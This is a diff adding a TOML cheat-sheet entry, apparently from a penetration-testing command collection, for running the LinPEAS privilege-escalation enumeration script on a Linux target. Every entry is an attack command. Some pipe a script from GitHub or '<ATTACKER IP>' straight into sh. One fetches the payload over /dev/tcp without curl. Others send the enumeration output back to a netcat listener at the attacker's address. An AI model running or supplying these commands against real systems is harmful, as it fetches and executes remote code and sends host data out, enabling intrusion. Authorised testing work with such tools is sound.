@@ -1,0 +1,40 @@
+title = "Internal enumeration for linux privilege escalation"
+description = "Quickly get internal information and search for possible paths to escalate privileges"
+tags = ["linux", "enum", "privesc"]
+source = ["https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"]
+
+[[data]]
+description = "Run LinPEAS directly from memory:"
+language = "bash"
+command = """curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"""
+
+[[data]]
+description = "If you are on the same local network as the target:"
+language = "bash"
+command = """#Attacker:
+sudo python3 -m http.server 80
+
+#Target:
+curl <ATTACKER IP>/linpeas.sh | sh 
+"""
+
+[[data]]
+description = "Without curl:"
+language = "bash"
+command = """#Attacker:
+sudo nc -q 5 -lvnp 80 < linpeas.sh
+
+#Target:
+cat < /dev/tcp/<ATTACKER IP>/80 | sh"""
+
+[[data]]
+description = "Execute from memory and send output back to the attacker:"
+language = "bash"
+command = """#Attacker:
+nc -lvnp 9002 | tee linpeas.out
+
+#Target:
+curl <ATTACKER IP>:8000/linpeas.sh | sh | nc 10.10.14.20 9002
+# or
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | nc <ATTACKER IP> 9002
+"""
